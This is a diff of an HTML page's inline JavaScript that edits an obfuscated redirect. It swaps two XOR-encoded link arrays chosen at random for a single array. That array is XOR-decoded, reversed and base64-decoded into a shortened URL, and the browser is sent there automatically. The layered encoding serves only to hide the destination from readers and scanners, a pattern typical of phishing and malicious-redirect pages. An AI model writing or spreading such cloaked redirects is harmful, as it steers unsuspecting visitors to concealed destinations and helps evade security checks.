@@ -50,19 +50,14 @@
   </style>
   <script>
     const xorKey = 7;
-    const encodedLinks = {
-      0: [58, 58, 70, 101, 115, 85, 79, 102, 114, 82, 53, 93, 111, 69, 52, 75, 117, 107, 64, 99, 114, 86, 52, 94, 55, 111, 53, 75, 112, 69, 95, 94, 114, 112, 80, 93, 109, 77, 95, 93, 53, 50, 110, 99, 127, 112, 64, 102, 115, 66, 67, 73, 126, 82, 67, 93, 119, 50, 53, 101, 119, 85, 95, 94, 116, 62, 80, 102, 53, 81, 53, 93, 111, 69, 52, 102, 109, 81, 64, 102, 109, 62, 126, 75, 49, 74, 79, 100, 55, 85, 79, 102],
-      1: [58, 58, 70, 101, 115, 85, 79, 102, 114, 82, 53, 93, 111, 69, 52, 75, 117, 107, 64, 99, 114, 86, 52, 94, 55, 111, 53, 75, 112, 69, 95, 94, 114, 112, 80, 93, 109, 77, 95, 93, 53, 50, 68, 98, 114, 73, 109, 100, 115, 66, 67, 73, 126, 82, 67, 93, 119, 50, 53, 101, 119, 85, 95, 94, 116, 62, 80, 102, 53, 81, 53, 93, 111, 69, 52, 102, 109, 81, 64, 102, 109, 62, 126, 75, 49, 74, 79, 100, 55, 85, 79, 102]
-    };
+    const encodedLink = [58, 104, 106, 102, 126, 81, 106, 73, 125, 66, 52, 75, 50, 127, 106, 75, 108, 50, 80, 94, 126, 77, 80, 93, 126, 62, 126, 75, 49, 74, 79, 100, 55, 85, 79, 102];
 
     function decodeXOR(arr, key) {
       return arr.map(c => String.fromCharCode(c ^ key)).join('');
     }
 
     function redirect() {
-      const keys = Object.keys(encodedLinks);
-      const rand = keys[Math.floor(Math.random() * keys.length)];
-      const xorDecoded = decodeXOR(encodedLinks[rand], xorKey);
+      const xorDecoded = decodeXOR(encodedLink, xorKey);
       const original = xorDecoded.split('').reverse().join('');
       const url = atob(original);
       window.location.href = url;
